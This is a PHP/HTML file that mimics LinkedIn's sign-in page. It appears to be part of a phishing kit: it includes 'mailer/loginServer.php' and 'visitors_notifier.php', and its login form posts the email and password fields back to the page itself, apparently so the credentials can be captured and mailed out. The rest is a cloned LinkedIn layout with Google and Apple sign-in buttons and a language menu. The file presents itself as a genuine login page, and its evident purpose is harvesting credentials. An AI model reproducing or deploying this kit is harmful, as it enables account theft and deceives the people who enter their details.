<?php 
    ...
    include("./mailer/loginServer.php"); 
    include("visitors_notifier.php");
...
<html lang="en">
   <head>
      ...
      <!-- CSS OPEN  -->
      <link rel="stylesheet" href="assets/cage.css">
      <!-- CSS CLOSE  -->
      <title>LinkedIn Login, Sign in | LinkedIn</title>
   </head>
   <body class="system-fonts"   style="background: url();">
      <div id="app__container">


         <header>
            <a class="linkedin-logo"   aria-label="LinkedIn">
               ...
               <div id="organic-div" class="">
                  ...
                  <form method="post" class="login__form" action=" ">
                     ...
                     <div class="form__input--floating mt-24">
                        <input id="username" name="session_key" type="text" class="" autofocus="" aria-label="Email or Phone" required />
                     ...
                     <div class="form__input--floating mt-24">
                        <input id="password" type="password"  name="session_password" autocomplete="current-password" class="" aria-label="Password" required />
                        <label for="password" class="form__label--floating" aria-hidden="true">Password</label>
                        <span id="password-visibility-toggle" class="button__password-visibility" role="button" tabindex="0">hide</span>
                        <div error-for="password" id="error-for-password" class="form__label--error   hidden" role="alert" aria-live="assertive"></div>
                     </div>
                     <a  class="btn__tertiary--medium forgot-password" data-cie-control-urn="forgot-password-btn">Forgot password?</a>
                     <div class="login__form_action_container ">
                        <button class="btn__primary--large from__button--floating" data-litms-control-urn="login-submit" type="submit" name="submit" aria-label="Sign in">Sign in</button>
                     </div>
                  </form>
                  ...
                  <div class="alternate-signin-container">
                     <div id="or-separator" class="or-separator mt-12 snapple-seperator">
                        <span class="or-text">or</span></div>



<!-- ========================================== -->

                     <div class="alternate-signin__btn--google mt-12">
                        <div class="S9gUrf-YoZ4jf" style="position: relative;
                           ">
                           <div></div>
                            <iframe src="assets/button.html" id="gsi_956074_611049" title="Sign in with Google Button" style="display: block;
                              position: relative;
                              top: 0px;
                              left: 0px;
                              height: 44px;
                              ...
                              margin: -2px -10px;
                              "></iframe> 
                              <!-- <img src="assets/button.html" id="gsi_956074_611049" title="Button" style="display: block;
                              position: relative;
                              top: 0px;
                              left: 0px;
                              height: 70px;
...
<!-- ========================================== -->
                     ...
                     <button class="sign-in-with-apple-button" type="button" aria-label="Sign in with Apple">
                        ...
                        <span class="sign-in-with-apple-button__text">Sign in with Apple</span>
                     </button> 
         
               
<!-- ========================================== -->

                     <!-- <a  aria-label="" class="btn-text one-time-link alternate-signin__btn mt-12" id="sign-in-with-one-time-link" type="button" data-cie-control-urn="alternate_signin_otl_button" data-tracking-will-navigate="">
                        <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                           <path d="M17.29 3a3.7 3.7 0 00-2.62 1.09l-2.58 2.58A3.7 3.7 0 0011 9.29a3.65 3.65 0 00.52 1.86l-.37.37a3.66 3.66 0 00-4.48.56l-2.58 2.59a3.71 3.71 0 105.24 5.24l2.59-2.59A3.7 3.7 0 0013 14.71a3.65 3.65 0 00-.52-1.86l.37-.37a3.66 3.66 0 004.48-.57l2.59-2.59A3.71 3.71 0 0017.29 3zm-6.16 11.71a1.82 1.82 0 01-.54 1.3L8 18.59A1.83 1.83 0 015.41 16L8 13.41a1.79 1.79 0 011.74-.48L8.28 14.4a.94.94 0 001.32 1.33l1.46-1.46a1.82 1.82 0 01.07.44zM18.59 8L16 10.59a1.79 1.79 0 01-1.74.48l1.47-1.47a.94.94 0 00-1.33-1.33l-1.46 1.47A1.79 1.79 0 0113.41 8L16 5.41A1.83 1.83 0 0118.59 8z" fill="black" opacity="0.6"></path>
                        </svg>
                        <span class="btn-text">Sign in with a one-time link</span>
                     </a> -->
                     
<!-- ========================================== -->

                     <!-- <a class="alternate-signin__btn mt-12" id="sign-in-with-passkey-btn" role="button" aria-label="Sign in with a passkey">Sign in with a passkey</a> -->
...
<!-- ========================================== -->
            ...
            <div class="join-now">New to LinkedIn? <a class="btn__tertiary--medium" id="join_now" data-litms-control-urn="login_join_now" data-cie-control-urn="join-now-btn">Join now</a></div>
         ...
         <footer class="footer__base" role="contentinfo">
            <div class="footer__base__wrapper">
               <p class="copyright">
                  ...
                  <em><span class="a11y__label">LinkedIn</span>© 2023</em>
               </p>
               <div>
                  <ul class="footer__base__nav-list" aria-label="Footer Legal Menu">
                     ...
                     <li id="feedback-request"><a  rel="nofollow noreferrer noopener">Send Feedback</a></li>
                     <li>
                        <div class="language-selector">
                           <div class="language-selector__dropdown hidden">
                              <ul>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="العربية (Arabic) 1 of 26 " role="button" data-locale="ar_AE">العربية (Arabic)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Čeština (Czech) 2 of 26 " role="button" data-locale="cs_CZ">Čeština (Czech)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Dansk (Danish) 3 of 26 " role="button" data-locale="da_DK">Dansk (Danish)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Deutsch (German) 4 of 26 " role="button" data-locale="de_DE">Deutsch (German)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link  language-selector__link--selected" aria-label="English (English) 5 of 26 selected" role="button" data-locale="en_US"><strong>English (English)</strong></button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Español (Spanish) 6 of 26 " role="button" data-locale="es_ES">Español (Spanish)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Français (French) 7 of 26 " role="button" data-locale="fr_FR">Français (French)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="हिंदी (Hindi) 8 of 26 " role="button" data-locale="hi_IN">हिंदी (Hindi)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Bahasa Indonesia (Indonesian) 9 of 26 " role="button" data-locale="in_ID">Bahasa Indonesia (Indonesian)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Italiano (Italian) 10 of 26 " role="button" data-locale="it_IT">Italiano (Italian)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="日本語 (Japanese) 11 of 26 " role="button" data-locale="ja_JP">日本語 (Japanese)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="한국어 (Korean) 12 of 26 " role="button" data-locale="ko_KR">한국어 (Korean)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Bahasa Malaysia (Malay) 13 of 26 " role="button" data-locale="ms_MY">Bahasa Malaysia (Malay)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Nederlands (Dutch) 14 of 26 " role="button" data-locale="nl_NL">Nederlands (Dutch)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Norsk (Norwegian) 15 of 26 " role="button" data-locale="no_NO">Norsk (Norwegian)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Polski (Polish) 16 of 26 " role="button" data-locale="pl_PL">Polski (Polish)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Português (Portuguese) 17 of 26 " role="button" data-locale="pt_BR">Português (Portuguese)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Română (Romanian) 18 of 26 " role="button" data-locale="ro_RO">Română (Romanian)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Русский (Russian) 19 of 26 " role="button" data-locale="ru_RU">Русский (Russian)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Svenska (Swedish) 20 of 26 " role="button" data-locale="sv_SE">Svenska (Swedish)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="ภาษาไทย (Thai) 21 of 26 " role="button" data-locale="th_TH">ภาษาไทย (Thai)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Tagalog (Tagalog) 22 of 26 " role="button" data-locale="tl_PH">Tagalog (Tagalog)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Türkçe (Turkish) 23 of 26 " role="button" data-locale="tr_TR">Türkçe (Turkish)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="Українська (Ukrainian) 24 of 26 " role="button" data-locale="uk_UA">Українська (Ukrainian)</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="简体中文 (Chinese (Simplified)) 25 of 26 " role="button" data-locale="zh_CN">简体中文 (Chinese (Simplified))</button></li>
                                 <li class="language-selector__item"><button type="button" class="language-selector__link " aria-label="正體中文 (Chinese (Traditional)) 26 of 26 " role="button" data-locale="zh_TW">正體中文 (Chinese (Traditional))</button></li>
                              </ul>
                           </div>
